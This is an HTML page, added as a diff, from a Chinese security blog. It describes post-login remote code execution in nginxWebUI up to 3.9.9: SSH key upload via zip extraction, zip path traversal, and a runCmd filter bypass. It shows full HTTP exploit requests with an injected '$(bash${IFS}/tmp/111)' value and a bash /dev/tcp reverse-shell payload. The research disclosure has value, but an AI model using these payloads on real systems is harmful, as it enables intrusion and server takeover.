@@ -1,0 +1,902 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="unam4">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="​		首发于https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;14227   前言​		半年前，审计过一次这套代码，那时候想着后台有命令执行的功能点，就没关注rce，审计了一些别的水洞。这次hookdd没事，说审计了一个rce，说一起看看，所以这次就只看rce，最后就有个以下几个洞。本次使用的3.9.8版本，但是刚刚更新了3.9.9，不过看描述，并没有修复一下几个点，应该都可以使用。（最新版依旧可用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="nginxwebui&lt;&#x3D;3.9.9后台rce">
+<meta property="og:url" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/index.html">
+<meta property="og:site_name" content="unam4">
+<meta property="og:description" content="​		首发于https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;14227   前言​		半年前，审计过一次这套代码，那时候想着后台有命令执行的功能点，就没关注rce，审计了一些别的水洞。这次hookdd没事，说审计了一个rce，说一起看看，所以这次就只看rce，最后就有个以下几个洞。本次使用的3.9.8版本，但是刚刚更新了3.9.9，不过看描述，并没有修复一下几个点，应该都可以使用。（最新版依旧可用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329094943539.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329095519164.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329095527428.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329100106111.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329100312049.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329100458257.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329100908051.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329101000205.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329101209075.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329101451560.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329101751292.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329101826366.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329102004582.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329103914323.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329104044288.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329104055165.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329104110206.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329104455283.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329104820562.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329105024339.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329105331535.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329110204537.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329110244552.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329110338516.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329110739896.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329110828441.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329110836847.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329155921247.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329160038310.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329160044572.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329160352345.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329160433191.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329161043497.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329161117706.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329161155744.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329161204639.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329220127636.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329223018517.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329223111645.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240330002357857.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240330002434052.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240330002657116.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240330002622189.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240330002803528.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240330002630229.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240330003342822.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240330003420470.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240330003524958.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240330002657116.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240330003729310.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240417215333266.png">
+<meta property="og:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240417215410337.png">
+<meta property="article:published_time" content="2024-04-06T15:57:01.000Z">
+<meta property="article:modified_time" content="2024-05-28T07:25:31.472Z">
+<meta property="article:author" content="unam4">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://unam4.github.io/2024/04/06/nginxwebui-3-9-9%E5%90%8E%E5%8F%B0rce/image-20240329094943539.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>nginxwebui&lt;=3.9.9后台rce - unam4</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"unam4.github.io","root":"/","version":"1.9.6","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>unam4&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/01.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="nginxwebui&lt;=3.9.9后台rce"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-04-06 23:57" pubdate>
+          2024年4月6日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          937 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          8 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">nginxwebui&lt;=3.9.9后台rce</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>​		首发于<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14227">https://xz.aliyun.com/t/14227</a>  </p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​		半年前，审计过一次这套代码，那时候想着后台有命令执行的功能点，就没关注rce，审计了一些别的水洞。这次hookdd没事，说审计了一个rce，说一起看看，所以这次就只看rce，最后就有个以下几个洞。本次使用的3.9.8版本，但是刚刚更新了3.9.9，不过看描述，并没有修复一下几个点，应该都可以使用。（最新版依旧可用，nginx恶意配置看来是修不了了）</p>
+<h2 id="0x01-zip自解压"><a href="#0x01-zip自解压" class="headerlink" title="0x01 zip自解压"></a>0x01 zip自解压</h2><p>com.cym.controller.adminPage.MainController#upload </p>
+<p><img src="image-20240329094943539.png" srcset="/img/loading.gif" lazyload alt="image-20240329094943539"></p>
+<p>功能比较简单，可以看见把tmpdir+’&#x2F;‘+文件名拼接，然后保存进去，没有限制后缀，其实限制不限制都能r掉。</p>
+<p>其中FileUtil.getTmpDir()会获取系统的临时目录，mac系统为</p>
+<p><img src="image-20240329095519164.png" srcset="/img/loading.gif" lazyload alt="image-20240329095519164"></p>
+<p><img src="image-20240329095527428.png" srcset="/img/loading.gif" lazyload alt="image-20240329095527428"></p>
+<p>ubuntu系统的临时目录为&#x2F;tmp。</p>
+<p>对应的前端功能点</p>
+<p><img src="image-20240329100106111.png" srcset="/img/loading.gif" lazyload alt="image-20240329100106111"></p>
+<p>前端这里是限制了zip上传，但是我们看后端是没有判断的，直接会把上传的文件放到临时目录。</p>
+<p><img src="image-20240329100312049.png" srcset="/img/loading.gif" lazyload alt="image-20240329100312049"></p>
+<p>当我们选择好目录时，他会调用</p>
+<p>com.cym.controller.adminPage.WwwController#addOver进行处理</p>
+<p><img src="image-20240329100458257.png" srcset="/img/loading.gif" lazyload alt="image-20240329100458257"></p>
+<p>可以看到，我们能控制解压目录，以及需要解压的文件，最后调用zip进行解压。</p>
+<p>那么其实很简单了，TmpDir()我们知道，文件名知道，我们只需要上传一个ssh密钥到.ssh目录下就可以了。</p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>先选择要上传的zip文件</p>
+<p><img src="image-20240329100908051.png" srcset="/img/loading.gif" lazyload alt="image-20240329100908051"></p>
+<p><img src="image-20240329101000205.png" srcset="/img/loading.gif" lazyload alt="image-20240329101000205"></p>
+<p>可以看到以及上传到tmp目录，这是macos的，ubutu在**&#x2F;tmp**下</p>
+<p><img src="image-20240329101209075.png" srcset="/img/loading.gif" lazyload alt="image-20240329101209075"></p>
+<p>选择好ssh目录。</p>
+<p><img src="image-20240329101451560.png" srcset="/img/loading.gif" lazyload alt="image-20240329101451560"></p>
+<p>对应数据包。</p>
+<p><img src="image-20240329101751292.png" srcset="/img/loading.gif" lazyload alt="image-20240329101751292"></p>
+<p>最后直接调用zip解压到ssh目录</p>
+<p><img src="image-20240329101826366.png" srcset="/img/loading.gif" lazyload alt="image-20240329101826366"></p>
+<p>成功解压到ssh</p>
+<p><img src="image-20240329102004582.png" srcset="/img/loading.gif" lazyload alt="image-20240329102004582"></p>
+<p>最后也是使用公钥直接登录</p>
+<h2 id="0x02-zip目录穿越"><a href="#0x02-zip目录穿越" class="headerlink" title="0x02 zip目录穿越"></a>0x02 zip目录穿越</h2><p>上面那种方法，其实只能打一次，因为在zip解压的时候会在数据库查询，钥匙已经同目录穿过，会抛出异常。</p>
+<p><img src="image-20240329103914323.png" srcset="/img/loading.gif" lazyload alt="image-20240329103914323"></p>
+<p>com.cym.controller.adminPage.WwwController#addOver</p>
+<p><img src="image-20240329104044288.png" srcset="/img/loading.gif" lazyload alt="image-20240329104044288"></p>
+<p><img src="image-20240329104055165.png" srcset="/img/loading.gif" lazyload alt="image-20240329104055165"></p>
+<p><img src="image-20240329104110206.png" srcset="/img/loading.gif" lazyload alt="image-20240329104110206"></p>
+<p>这里可以清楚得看到，会在sql里面查询上传目录是否存在，存在就抛出异常。</p>
+<p>这里有两种解决办法，第一种就是<img src="image-20240329104455283.png" srcset="/img/loading.gif" lazyload alt="image-20240329104455283"></p>
+<p>传入ssh的id，使其能正常修改目录的文件内容</p>
+<p><img src="image-20240329104820562.png" srcset="/img/loading.gif" lazyload alt="image-20240329104820562"></p>
+<p>id可以直接f12获得，</p>
+<p><img src="image-20240329105024339.png" srcset="/img/loading.gif" lazyload alt="image-20240329105024339"></p>
+<p>填入后就可以正常穿</p>
+<p>第二种就比较暴力</p>
+<p>cn.hutool.core.util.ZipUtil#unzip(java.util.zip.ZipFile, java.io.File, long)</p>
+<p><img src="image-20240329105331535.png" srcset="/img/loading.gif" lazyload alt="image-20240329105331535"></p>
+<p>zipentry没有对..&#x2F;过滤。</p>
+<p>zip解压时是没有对zip目录穿越进行过滤的，所以可以利用zip目录穿越来传文件，dir保证是没有使用过的就行。</p>
+<h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>上传zip_slip.zip<img src="image-20240329110204537.png" srcset="/img/loading.gif" lazyload alt="image-20240329110204537"></p>
+<p><img src="image-20240329110244552.png" srcset="/img/loading.gif" lazyload alt="image-20240329110244552"></p>
+<p>得到路径</p>
+<p><img src="image-20240329110338516.png" srcset="/img/loading.gif" lazyload alt="image-20240329110338516"></p>
+<p>上传时显示路径重复，这时我们dir任意写一个本地存在的目录，确保数据库没有就行。</p>
+<p><img src="image-20240329110739896.png" srcset="/img/loading.gif" lazyload alt="image-20240329110739896"></p>
+<p>最后成功上传。</p>
+<p><img src="image-20240329110828441.png" srcset="/img/loading.gif" lazyload alt="image-20240329110828441"></p>
+<p><img src="image-20240329110836847.png" srcset="/img/loading.gif" lazyload alt="image-20240329110836847"></p>
+<p>数据库里面的状态。</p>
+<h2 id="0x03-runcmd绕过造成命令执行"><a href="#0x03-runcmd绕过造成命令执行" class="headerlink" title="0x03 runcmd绕过造成命令执行"></a>0x03 runcmd绕过造成命令执行</h2><p>com.cym.controller.adminPage.ConfController#runCmd</p>
+<p><img src="image-20240329155921247.png" srcset="/img/loading.gif" lazyload alt="image-20240329155921247"></p>
+<p>可以看到穿进来的cmd先进行过滤，在进行拼接执行。</p>
+<p>com.cym.controller.adminPage.ConfController#isAvailableCmd</p>
+<p><img src="image-20240329160038310.png" srcset="/img/loading.gif" lazyload alt="image-20240329160038310"></p>
+<p><img src="image-20240329160044572.png" srcset="/img/loading.gif" lazyload alt="image-20240329160044572"></p>
+<p>可以先读取nginxPath、nginxExe、nginxDir三个值，首先判断在不在case里面，不在就进入if，主要就是判断cmd和<strong>settingService.get(“nginxExe”) + “ -c “ + settingService.get(“nginxPath”) + dir</strong>是不是想等，不想等就不执行，想等就执行</p>
+<p>com.cym.controller.adminPage.ConfController#saveCmd</p>
+<p><img src="image-20240329160352345.png" srcset="/img/loading.gif" lazyload alt="image-20240329160352345"></p>
+<p>而刚好这三个值我们可自由控制。</p>
+<p><img src="image-20240329160433191.png" srcset="/img/loading.gif" lazyload alt="image-20240329160433191"></p>
+<p>它会对传值进行过滤，其实看看很好绕过。linux用$(IFS)代替空格就行，win用powershell.exe(calc) 就行</p>
+<h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20240329161043497.png" srcset="/img/loading.gif" lazyload alt="image-20240329161043497"></p>
+<p>先修改两个值</p>
+<p><img src="image-20240329161117706.png" srcset="/img/loading.gif" lazyload alt="image-20240329161117706"></p>
+<p>成功执行</p>
+<p><img src="image-20240329161155744.png" srcset="/img/loading.gif" lazyload alt="image-20240329161155744"></p>
+<p><img src="image-20240329161204639.png" srcset="/img/loading.gif" lazyload alt="image-20240329161204639"></p>
+<p>可以执行。</p>
+<p><img src="image-20240329220127636.png" srcset="/img/loading.gif" lazyload alt="image-20240329220127636"></p>
+<p>由于有过滤，所以我们可以把reserveshell写进文件，在用bash来执行就好。</p>
+<p>利用前面分析得，上传点自动缓存到tem目录，ubuntu为&#x2F;tmp目录.。强烈建议不要用macos这傻逼每个shell环境里面var&#x2F;folders&#x2F;ln&#x2F;sjz_zm513ng125ngw6c2b_lm0000gn都不一样。</p>
+<p><img src="image-20240329223018517.png" srcset="/img/loading.gif" lazyload alt="image-20240329223018517"></p>
+<p>换ubuntu后，成功rce</p>
+<p><img src="image-20240329223111645.png" srcset="/img/loading.gif" lazyload alt="image-20240329223111645"></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/adminPage/conf/saveCmd</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.108.137:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>55<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.108.137:8080<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.108.137:8080/adminPage/conf<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>SOLONID=2dc9dd75ef4242f4a74bc855799539ec<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-dts">nginxE<span class="hljs-attr">xe</span><span class="hljs-operator">=</span>bash<span class="hljs-variable">&amp;</span>nginxD<span class="hljs-attr">ir</span><span class="hljs-operator">=</span><span class="hljs-variable">&amp;</span>nginxP<span class="hljs-attr">ath</span><span class="hljs-operator">=</span>$(bash$<span class="hljs-punctuation">&#123;</span>IFS<span class="hljs-punctuation">&#125;</span><span class="hljs-keyword">/tmp/</span><span class="hljs-number">111</span>)</span><br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/adminPage/main/upload</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.108.137:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>231<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarygQGA2ci4A6Ii4KAG<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.108.137:8080<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.108.137:8080/adminPage/www<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>SOLONID=2dc9dd75ef4242f4a74bc855799539ec<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundarygQGA2ci4A6Ii4KAG</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;111&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/x-python-script</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">/bin/bash -i &gt;&amp; /dev/tcp/ip/<span class="hljs-number">9999</span> <span class="hljs-number">0</span>&gt;&amp;<span 